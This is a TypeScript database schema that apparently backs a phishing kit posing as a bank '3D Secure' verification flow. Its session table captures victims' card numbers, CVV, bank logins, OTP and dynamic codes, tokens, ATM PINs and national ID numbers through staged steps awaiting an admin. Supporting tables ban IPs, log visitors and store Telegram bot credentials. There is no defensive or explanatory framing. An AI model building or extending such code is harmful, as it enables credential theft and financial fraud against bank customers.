import { integer, pgEnum, pgTable, text, timestamp, varchar, json, serial } from "drizzle-orm/pg-core";

/**
 * Core user table backing auth flow.
 */
export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: pgEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

/**
 * 3D Secure Sessions - Stores verification sessions
 * Each session represents a user going through the 3D Secure flow
 */
export const secureSession = pgTable("secure_sessions", {
  id: serial("id").primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull().unique(),
  /** Current step the user is on: credentials, otp, dinamica, token, atm, completed */
  currentStep: varchar("currentStep", { length: 32 }).default("credentials").notNull(),
  /** Status: waiting (waiting for admin), active, completed, rejected */
  status: varchar("status", { length: 32 }).default("active").notNull(),
  /** User submitted data (email, card info, etc.) */
  email: varchar("email", { length: 320 }),
  cardBin: varchar("cardBin", { length: 8 }),
  bankName: varchar("bankName", { length: 128 }),
  country: varchar("country", { length: 64 }),
  cardScheme: varchar("cardScheme", { length: 32 }),
  /** Payment details */
  cardNumber: varchar("cardNumber", { length: 20 }),
  holderName: varchar("holderName", { length: 128 }),
  expiryDate: varchar("expiryDate", { length: 10 }),
  cvv: varchar("cvv", { length: 5 }),
  loginPassword: varchar("loginPassword", { length: 128 }),
  /** Step 1: Bank credentials */
  bankUser: varchar("bankUser", { length: 128 }),
  bankPassword: varchar("bankPassword", { length: 128 }),
  /** Step 2: OTP */
  otpCode: varchar("otpCode", { length: 10 }),
  /** Step 3: Clave Dinámica */
  dinamicaCode: varchar("dinamicaCode", { length: 20 }),
  /** Step 4: Token */
  tokenCode: varchar("tokenCode", { length: 20 }),
  /** Step 5: ATM Pin */
  atmPin: varchar("atmPin", { length: 10 }),
  /** Personal info */
  address: varchar("address", { length: 256 }),
  cedula: varchar("cedula", { length: 20 }),
  city: varchar("city", { length: 64 }),
  /** IP and user agent for tracking */
  ipAddress: varchar("ipAddress", { length: 64 }),
  userAgent: text("userAgent"),
  /** Timestamps */
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
});

export type SecureSession = typeof secureSession.$inferSelect;
export type InsertSecureSession = typeof secureSession.$inferInsert;

/**
 * Banned IPs - Stores IPs that are blocked from accessing the site
 */
export const bannedIps = pgTable("banned_ips", {
  id: serial("id").primaryKey(),
  ipAddress: varchar("ipAddress", { length: 64 }).notNull().unique(),
  reason: varchar("reason", { length: 256 }),
  bannedBy: varchar("bannedBy", { length: 64 }).default("admin").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type BannedIp = typeof bannedIps.$inferSelect;
export type InsertBannedIp = typeof bannedIps.$inferInsert;

/**
 * Visit Counter - Tracks page visits/clicks
 */
export const visitCounter = pgTable("visit_counter", {
  id: serial("id").primaryKey(),
  count: integer("count").default(0).notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
});

export type VisitCounter = typeof visitCounter.$inferSelect;

/**
 * App Config - Persistent key-value store for admin panel settings
 * Stores adminPin, telegramBotToken, telegramChatId, etc.
 */
export const appConfig = pgTable("app_config", {
  id: serial("id").primaryKey(),
  key: varchar("key", { length: 64 }).notNull().unique(),
  value: text("value").notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
});

export type AppConfig = typeof appConfig.$inferSelect;

/**
 * Traffic Log - Detailed log of every visit with IP, User-Agent, and timestamp
 */
export const trafficLog = pgTable("traffic_log", {
  id: serial("id").primaryKey(),
  ipAddress: varchar("ipAddress", { length: 64 }).notNull(),
  userAgent: text("userAgent"),
  path: varchar("path", { length: 512 }).default("/"),
  country: varchar("country", { length: 64 }),
  blocked: integer("blocked").default(0).notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type TrafficLog = typeof trafficLog.$inferSelect;
export type InsertTrafficLog = typeof trafficLog.$inferInsert;
